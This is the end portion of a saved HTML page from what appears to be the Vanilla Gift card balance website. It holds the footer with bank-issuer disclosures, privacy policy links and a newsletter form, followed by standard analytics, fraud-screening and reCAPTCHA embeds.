                                                <!----> Help <!---->
                                             </a>
                                             <!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!----><!----><!---->
                                             <a _ngcontent-fen-c7="" href="/activateCard">
                                                <!----> Activate Replacement <!---->
                                             </a>
                                             <!---->
                                          </app-link>
                                       </li>
                                    </ul>
                                 </div>
                              </div>
                           </div>
                           <div _ngcontent-fen-c4="" class="line-divider"></div>
                           <!---->
                           <div _ngcontent-fen-c4="" class="product-nav row">
                              <div _ngcontent-fen-c4="" class="col-xs-12">
                                 <div _ngcontent-fen-c4="" class="col-xs-12 col-sm-6 col-md-6 noPadding">
                                    <!---->
                                    <div _ngcontent-fen-c4="" class="copyright col-md-12 col-sm-12 col-xs-12 collapse-padding vertical-spacing-top-5">
                                       <p>Copyright © 2021 &nbsp;InComm. All rights reserved.</p>
                                       <p>Vanilla Visa<sup>®</sup> Gift Cards are issued by TBBK Card Services, Inc., MetaBank<sup>®</sup>, N.A. or Sutton Bank, pursuant to a license from Visa U.S.A. Inc. MetaBank, N.A. and Sutton Bank, Members FDIC. See the back of your card for issuing bank. Vanilla Discover<sup>®</sup> Gift Cards are issued by The Bancorp Bank, Member FDIC. Vanilla Mastercard<sup>®</sup> Gift Cards are issued by The Bancorp Bank, MetaBank, N.A. or Sutton Bank pursuant to license by Mastercard International Incorporated. Mastercard is a registered trademark, and the circles design is a trademark of Mastercard International Incorporated. Vanilla Bill Payment Prepaid Visa Cards are issued by TBBK Card Services, Inc. pursuant to a license from Visa U.S.A. Inc. Vanilla Bill Payment Prepaid Mastercard is issued by The Bancorp Bank pursuant to license by Mastercard International Incorporated. Cards may be used in the U.S. and District of Columbia everywhere Visa debit cards, Debit Mastercard or Discover cards are accepted. No cash or ATM access. Terms and conditions apply. See Cardholder Agreement for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772. </p>
                                    </div>
                                 </div>
                                 <div _ngcontent-fen-c4="" class="col-sm-1 col-md-1 hidden-xs vertical-padding-top-5">
                                    <ul _ngcontent-fen-c4="" class="collapse-padding text-center">
                                       <!---->
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://www.facebook.com/vanillagift" target="_blank">
                                                   <!----><img _ngcontent-fen-c4="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/78Yy51ONrVydvnmpqE2sqn/56c63192a47c0e73d46874296636eaa6/VG_SocialIcons_FB.png"><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://www.instagram.com/vanillagiftcards/" target="_blank">
                                                   <!----><img _ngcontent-fen-c4="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/51fyyesWzBkhuPUrSdoP1Z/78766e4227048f9298010b9410db3d43/VG_SocialIcons_Instagram.png"><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://www.pinterest.com/VanillaGift/" target="_blank">
                                                   <!----><img _ngcontent-fen-c4="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/6lpt7EUvapqdQf4xin6PAz/12dc1846714a461c53bf1c04e52f9a86/VG_SocialIcons_Pinterest.png"><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                    </ul>
                                 </div>
                                 <div _ngcontent-fen-c4="" class="col-xs-12 col-sm-5 col-md-5 noPadding">
                                    <!---->
                                    <app-newsletter _ngcontent-fen-c4="" _nghost-fen-c8="">
                                       <!---->
                                       <div _ngcontent-fen-c8="" class="getTheScoop">
                                          <h2 _ngcontent-fen-c8="">Get the Scoop on Vanilla Gift</h2>
                                          <form _ngcontent-fen-c8="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
                                             <input _ngcontent-fen-c8="" class="form-control fontMD font15px ng-untouched ng-pristine ng-invalid" formcontrolname="newsletter_email" id="newsletter_email" name="newsletter_email" type="text" value="" placeholder="Email Address"><input _ngcontent-fen-c8="" formcontrolname="newsletterToCheck" id="newsletter_tc_check" name="newsletter_tc_check" type="checkbox" class="ng-untouched ng-pristine ng-valid">
                                             <label _ngcontent-fen-c8="" for="newsletter_tc_check">
                                                <span _ngcontent-fen-c8="" class="scoopNew-letterInfo">
                                                   <p>Please send me tips, news, and special offers from and on behalf of Vanilla Gift. I understand that my information will be used as described in the <a href="http://www.fscarddisclosures.com/Bancorp_Privacy_Policy.pdf">Privacy Policy</a>.</p>
                                                </span>
                                             </label>
                                             <input _ngcontent-fen-c8="" class="btnGo button button-signMe btn btn-primary btn-block btn-md" id="btnGo" type="submit" value="Sign Me Up!">
                                          </form>
                                       </div>
                                    </app-newsletter>
                                 </div>
                              </div>
                           </div>
                           <!----><!---->
                           <div _ngcontent-fen-c4="" class="copyright col-xs-12 collapse-padding">
                              <p>Colorado, Maryland, and Texas customers: <a href="http://www.fscarddisclosures.com" target="_blank">View information</a>&nbsp;about addressing complaints regarding our money services business.</p>
                           </div>
                           <!---->
                           <div _ngcontent-fen-c4="" class="bottom-nav">
                              <div _ngcontent-fen-c4="" class="row noMargin">
                                 <div _ngcontent-fen-c4="" class="col-xs-12 col-sm-12 noPadding">
                                    <ul _ngcontent-fen-c4="" class="noPadding">
                                       <!---->
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://fscarddisclosures.com/TBBK_Privacy_Policy_EN.pdf" target="_blank">
                                                   <!----><span _ngcontent-fen-c4="">TBBK Card Services, Inc. Privacy Policy</span><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="http://fscarddisclosures.com/Bancorp_Privacy_Policy.pdf" target="_blank">
                                                   <!----><span _ngcontent-fen-c4="">The Bancorp Bank Privacy Policy</span><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://fscarddisclosures.com/MetaBank_Privacy_Policy_EN.pdf" target="_blank">
                                                   <!----><span _ngcontent-fen-c4="">MetaBank<sup>®</sup>, N.A. Privacy Policy</span><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="http://www.fscarddisclosures.com/WK_Privacy_Disclosure_1218.pdf" target="_blank">
                                                   <!----><span _ngcontent-fen-c4="">Sutton Bank Privacy Policy</span><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!---->
                                             <div _ngcontent-fen-c7="">
                                                <!---->
                                                <a _ngcontent-fen-c7="" href="https://fscarddisclosures.com/InComm_Website_Terms_of_Use__General___July_2016_.pdf" target="_blank">
                                                   <!----><span _ngcontent-fen-c4="">Terms of Use</span><!---->
                                                </a>
                                                <!----><!---->
                                             </div>
                                             <!----><!----><!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <!---->
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!----><!----><!---->
                                             <a _ngcontent-fen-c7="" href="/cardholderAgreement">
                                                <!----><span _ngcontent-fen-c4="">Cardholder Agreement</span><!---->
                                             </a>
                                             <!---->
                                          </app-link>
                                       </li>
                                    </ul>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </footer>
               <!---->
            </app-footer>
         </div>
         <app-notification _ngcontent-fen-c0="" _nghost-fen-c5="">
            <!----><!---->
         </app-notification>
      </app-root>
      <script type="text/javascript" src="runtime.26209474bfa8dc87a77c.js"></script><script type="text/javascript" src="polyfills.6ea8b0b443f9cd10095e.js"></script><script type="text/javascript" src="main.9d15e36dc7973866b32b.js"></script>
      <!-- Global site tag (gtag.js) - Google Analytics -->
      <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-2306615-66"></script>
      <script>
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
         
         gtag('config', 'UA-2306615-66');
      </script>
      <iframe id="ibody" style="border: 0px none; height: 0px; width: 0px; position: absolute;" src="https://ssl.kaptcha.com/logo.htm?m=109700&amp;s=15da33b211654123bec1774939a5276b"></iframe>
      <div>
         <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
            <div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LdwldIZAAAAABqe6wiGR7pO3ypHl9b_LM78_W99&amp;co=aHR0cHM6Ly9iYWxhbmNlLnZhbmlsbGFnaWZ0LmNvbTo0NDM.&amp;hl=en&amp;v=VZKEDW9wslPbEc9RmzMqaOAP&amp;size=invisible&amp;cb=1irjharqeanl" role="presentation" name="a-avgmudktcm29" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div>
            <div class="grecaptcha-error"></div>
            <textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
         </div>
      </div>
      <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
         <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div>
         <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="recaptcha challenge expires in two minutes" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=VZKEDW9wslPbEc9RmzMqaOAP&amp;k=6Lc7IcIUAAAAAOPBNC4usz2kFYS23xU-zVjCYsSl" style="width: 100%; height: 100%;" name="c-a48wdka0th4d" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" frameborder="0"></iframe></div>
      </div>
   </body>
</html>

